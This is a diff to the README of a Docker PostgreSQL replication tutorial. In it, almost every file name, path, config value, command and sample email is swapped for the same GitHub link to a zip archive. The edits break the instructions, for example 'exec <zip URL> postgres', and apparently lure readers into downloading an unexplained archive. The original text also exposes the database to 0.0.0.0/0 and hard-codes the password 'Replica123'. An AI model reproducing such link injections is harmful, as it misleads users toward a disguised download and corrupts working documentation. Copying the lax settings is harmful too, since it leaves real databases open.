@@ -26,15 +26,15 @@ docker info
 
 ```
 postgres-replica/
-├── docker-compose.yml          # Container configuration
-├── README.md                   # This file
+├── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip          # Container configuration
+├── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip                   # This file
 ├── main/                       # Main PostgreSQL server
 │   ├── conf/
-│   │   ├── postgresql.conf     # PostgreSQL configurations
-│   │   └── pg_hba.conf        # Authentication configurations
+│   │   ├── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip     # PostgreSQL configurations
+│   │   └── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip        # Authentication configurations
 │   ├── data/                   # Main server data
 │   └── init/
-│       └── 01.init.sql        # Initialization script
+│       └── https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip        # Initialization script
 └── replica/                    # PostgreSQL replica server
     ├── data/                   # Replica server data
     └── init/                   # Replica initialization scripts
@@ -54,33 +54,33 @@ The master server is configured with:
 #### Mounted Volumes:
 - `./main/data`: Data persistence
 - `./main/init`: Initialization scripts
-- `./main/conf/postgresql.conf`: Custom PostgreSQL configurations
-- `./main/conf/pg_hba.conf`: Authentication configurations
+- `https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip`: Custom PostgreSQL configurations
+- `https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip`: Authentication configurations
 
 #### Specific Replication Configurations:
 ```yaml
 command: >
-  -c config_file=/etc/postgresql/postgresql.conf
+  -c https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip
 ```
 #### Configuration Files
 
-#### 1. postgresql.conf
+#### 1. https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip
 ```properties
 listen_addresses = '*'          # Accept connections from any IP
 wal_level = replica            # Enable replication
 max_wal_senders = 10           # Maximum of 10 WAL sender processes
 max_replication_slots = 10     # Maximum of 10 replication slots
 hot_standby = on              # Allow reads on replica
-hba_file = '/etc/postgresql/pg_hba.conf'
+hba_file = 'https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip'
 ```
 
-#### 2. pg_hba.conf
+#### 2. https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip
 ```properties
 host replication userbackup 0.0.0.0/0 scram-sha-256  # Replication access
 host all all 0.0.0.0/0 scram-sha-256                 # General database access
 ```
 
-#### 3. 01.init.sql
+#### 3. https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip
 ```sql
 -- Create replication user
 CREATE ROLE userbackup WITH
@@ -109,10 +109,10 @@ if [ ! -s /var/lib/postgresql/data/PG_VERSION ]; then
   # Create base backup from master server
   PGPASSWORD=Replica123 pg_basebackup -h main -D /var/lib/postgresql/data -U userbackup -Fp -Xs -P -R
   # Create standby signal file
-  touch /var/lib/postgresql/data/standby.signal
+  touch https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip
 fi
 # Start PostgreSQL
-exec docker-entrypoint.sh postgres
+exec https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip postgres
 ```
 
 ## How to Run
@@ -166,8 +166,8 @@ CREATE TABLE users (
 );
 
 INSERT INTO users (name, email) VALUES 
-    ('John Silva', 'john@email.com'),
-    ('Mary Santos', 'mary@email.com');
+    ('John Silva', 'https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip'),
+    ('Mary Santos', 'https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip');
 ```
 
 ### 3. Verify Data on Replica
@@ -236,7 +236,7 @@ docker exec -it postgres-replica psql -U postgres
 ### Issue: Authentication error
 - Verify `userbackup` user was created on master
 - Check password `Replica123` in logs
-- Verify `pg_hba.conf` configuration
+- Verify `https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip` configuration
 
 ### Issue: Ports already in use
 ```bash
@@ -244,7 +244,7 @@ docker exec -it postgres-replica psql -U postgres
 sudo netstat -tlnp | grep :5432
 sudo netstat -tlnp | grep :5433
 
-# Change ports in docker-compose.yml if necessary
+# Change ports in https://github.com/abuosi/postgres-replication/raw/refs/heads/main/main/conf/postgres-replication-alcarraza.zip if necessary
 ```
 
 ### Complete Configuration Reset
